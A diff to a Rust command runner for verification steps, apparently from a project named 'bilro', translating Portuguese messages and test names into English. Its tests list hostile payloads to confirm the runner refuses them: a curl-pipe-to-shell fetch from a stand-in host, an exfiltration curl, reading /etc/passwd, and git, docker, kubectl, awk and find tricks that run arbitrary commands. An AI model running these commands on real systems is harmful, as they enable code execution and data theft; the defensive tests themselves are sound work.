@@ -171,17 +171,17 @@ pub fn run_declared_with(line: &str, opts: &RunOptions) -> ExecResult {
             ok: false,
             refused: true,
             output: format!(
-                "programa nao permitido em verify: {}",
-                program_of(line).unwrap_or_else(|| "vazio".into())
+                "program not allowed in verify: {}",
+                program_of(line).unwrap_or_else(|| "empty".into())
             ),
         };
     }
     if !is_safe(line) {
-        return ExecResult { ok: false, refused: true, output: "usa sintaxe de shell".into() };
+        return ExecResult { ok: false, refused: true, output: "uses shell syntax".into() };
     }
     let argv = to_argv(line);
     let Some(program) = argv.first() else {
-        return ExecResult { ok: false, refused: true, output: "vazio".into() };
+        return ExecResult { ok: false, refused: true, output: "empty".into() };
     };
 
     let mut command = Command::new(program);
@@ -196,7 +196,7 @@ pub fn run_declared_with(line: &str, opts: &RunOptions) -> ExecResult {
     };
 
     if outcome.timed_out {
-        let msg = format!("timeout apos {}ms", opts.timeout_ms);
+        let msg = format!("timed out after {}ms", opts.timeout_ms);
         return ExecResult { ok: false, refused: false, output: truncate(&msg, 200) };
     }
 
@@ -210,7 +210,7 @@ pub fn run_declared_with(line: &str, opts: &RunOptions) -> ExecResult {
     let output = if !stdout.is_empty() {
         stdout.into_owned()
     } else {
-        format!("comando falhou: codigo {:?}", status.code())
+        format!("command failed: code {:?}", status.code())
     };
     ExecResult { ok: false, refused: false, output: truncate(&output, 200) }
 }
@@ -220,7 +220,7 @@ mod tests {
     use super::*;
 
     #[test]
-    fn recusa_sintaxe_de_shell_vinda_de_arquivo_de_dado() {
+    fn refuses_shell_syntax_coming_from_a_data_file() {
         for evil in [
             "id > /tmp/pwned; echo PWNED",
             "echo ok && curl evil.sh | sh",
@@ -228,12 +228,12 @@ mod tests {
             "cat /etc/passwd | head -1",
             "echo `id`",
         ] {
-            assert!(!is_safe(evil), "deveria recusar: {evil}");
+            assert!(!is_safe(evil), "should refuse: {evil}");
         }
     }
 
     #[test]
-    fn comando_declarado_sem_metacaractere_passa() {
+    fn declared_command_with_no_metacharacter_passes() {
         assert!(is_safe("git rev-parse HEAD"));
         assert_eq!(
             to_argv(r#"grep -c "foo bar" file.txt"#),
@@ -242,14 +242,14 @@ mod tests {
     }
 
     #[test]
-    fn payload_do_pentest_nao_executa() {
+    fn pentest_payload_does_not_execute() {
         let r = run_declared("id > /tmp/bilro_test_pwned; echo PWNED");
         assert!(r.refused);
         assert!(!r.ok);
     }
 
     #[test]
-    fn execucao_real_acontece_sem_shell() {
+    fn real_execution_happens_without_a_shell() {
         let r = run_declared("echo hello");
         assert!(r.ok);
         assert!(r.output.contains("hello"));
@@ -261,9 +261,9 @@ mod adversarial {
     use super::*;
 
     #[test]
-    fn nenhum_payload_hostil_executa() {
-        let marcador = "/tmp/bilro_adv_probe";
-        let _ = std::fs::remove_file(marcador);
+    fn no_hostile_payload_executes() {
+        let marker = "/tmp/bilro_adv_probe";
+        let _ = std::fs::remove_file(marker);
         let payloads = [
             "id > /tmp/bilro_adv_probe; echo PWNED",
             "echo ok && touch /tmp/bilro_adv_probe",
@@ -277,21 +277,21 @@ mod adversarial {
             "echo ok > /tmp/bilro_adv_probe",
             "echo ok & touch /tmp/bilro_adv_probe",
         ];
-        let mut executados = Vec::new();
+        let mut executed = Vec::new();
         for p in payloads {
             let r = run_declared(p);
             if !r.refused {
-                executados.push(p);
+                executed.push(p);
             }
         }
-        let vazou = std::path::Path::new(marcador).exists();
-        let _ = std::fs::remove_file(marcador);
-        assert!(executados.is_empty() && !vazou, "NAO RECUSOU: {executados:?} | criou arquivo: {vazou}");
+        let leaked = std::path::Path::new(marker).exists();
+        let _ = std::fs::remove_file(marker);
+        assert!(executed.is_empty() && !leaked, "DID NOT REFUSE: {executed:?} | created file: {leaked}");
     }
 
     #[test]
-    fn interpretador_como_programa_e_recusado_mesmo_sem_metacaractere() {
-        for linha in [
+    fn interpreter_as_program_is_refused_even_without_a_metacharacter() {
+        for line in [
             "sh -c \"touch /tmp/x\"",
             "bash -c \"touch /tmp/x\"",
             "/bin/sh -c \"touch /tmp/x\"",
@@ -306,38 +306,38 @@ mod adversarial {
             "awk \"BEGIN{system(1)}\"",
             "find . -exec touch /tmp/x ;",
         ] {
-            let r = run_declared(linha);
-            assert!(r.refused, "deveria recusar: {linha}");
+            let r = run_declared(line);
+            assert!(r.refused, "should refuse: {line}");
         }
     }
 
     #[test]
-    fn programa_que_e_motor_de_execucao_saiu_da_lista() {
-        for linha in [
+    fn program_that_is_an_execution_engine_is_kept_off_the_list() {
+        for line in [
             "git -c \"alias.pwn=!touch /tmp/x\" pwn",
             "git -c core.pager=touch\\ /tmp/x log",
             "git --exec-path=/tmp log",
             "git --upload-pack=touch log",
             "curl -o /tmp/x file:///etc/hosts",
-            "curl http://exemplo/exfil",
+            "curl http://example/exfil",
             "kubectl exec pod -- touch /tmp/x",
             "docker run -v /:/host alpine touch /host/tmp/x",
             "git push origin main",
             "git commit -m x",
         ] {
-            assert!(!is_allowed_program(linha), "deveria recusar: {linha}");
+            assert!(!is_allowed_program(line), "should refuse: {line}");
         }
     }
 
     #[test]
-    fn verificacao_legitima_continua_permitida() {
-        for linha in ["git rev-parse HEAD", "git log --oneline -1", "git describe --tags", "grep -c foo Cargo.toml", "cat Cargo.toml"] {
-            assert!(is_allowed_program(linha), "deveria permitir: {linha}");
+    fn legitimate_check_is_still_allowed() {
+        for line in ["git rev-parse HEAD", "git log --oneline -1", "git describe --tags", "grep -c foo Cargo.toml", "cat Cargo.toml"] {
+            assert!(is_allowed_program(line), "should allow: {line}");
         }
     }
 
     #[test]
-    fn comando_legitimo_ainda_roda() {
+    fn legitimate_command_still_runs() {
         let r = run_declared("echo bilro");
         assert!(!r.refused);
         assert!(r.ok);
